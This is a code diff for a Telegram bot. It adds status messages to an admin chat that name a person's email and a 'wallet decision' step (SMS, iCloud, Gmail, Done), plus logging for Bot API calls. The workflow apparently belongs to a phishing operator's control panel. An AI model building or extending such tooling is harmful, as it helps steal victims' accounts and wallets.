@@ -373,6 +373,28 @@ bot.on("callback_query", async (query) => {
           );
         } catch (err) {}
 
+        // ✅ SEND STATUS MESSAGE
+        let statusMessage = "";
+        
+        if (action === "wallet_decision_sms") {
+          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        } else if (action === "wallet_decision_done") {
+          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        } else if (action === "wallet_decision_icloud") {
+          statusMessage = `📧 <code>${email}</code> → ☁️`;
+        } else if (action === "wallet_decision_gmail") {
+          statusMessage = `📧 <code>${email}</code> → 🌈`;
+        }
+
+        if (statusMessage) {
+          try {
+            await bot.sendMessage(ADMIN_CHAT_ID, statusMessage, { parse_mode: "HTML" });
+            console.log(`✅ Status message sent for wallet decision: ${statusMessage}`);
+          } catch (err) {
+            console.error(`❌ Error sending status message:`, err.message);
+          }
+        }
+
         await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
         return;
       } catch (err) {
@@ -705,7 +727,7 @@ if (bot2) {
         if (statusMessage) {
           try {
             const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
-            await fetch(replyUrl, {
+            const response = await fetch(replyUrl, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({
@@ -714,8 +736,14 @@ if (bot2) {
                 parse_mode: "HTML"
               })
             });
+            
+            if (response.ok) {
+              console.log(`✅ Status message sent for wallet decision (Bot 2): ${statusMessage}`);
+            } else {
+              console.error(`❌ Failed to send status message (Bot 2). Response status: ${response.status}`);
+            }
           } catch (err) {
-            console.error(`❌ Failed to send status message:`, err);
+            console.error(`❌ Error sending status message (Bot 2):`, err.message);
           }
         }
 
@@ -959,7 +987,7 @@ if (bot2) {
         if (statusMessage) {
           try {
             const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            await fetch(replyUrl, {
+            const response = await fetch(replyUrl, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({
@@ -968,8 +996,14 @@ if (bot2) {
                 parse_mode: "HTML"
               })
             });
+            
+            if (response.ok) {
+              console.log(`✅ Status message sent for wallet decision: ${statusMessage}`);
+            } else {
+              console.error(`❌ Failed to send status message. Response status: ${response.status}`);
+            }
           } catch (err) {
-            console.error(`❌ Failed to send status message:`, err);
+            console.error(`❌ Error sending status message:`, err.message);
           }
         }
 
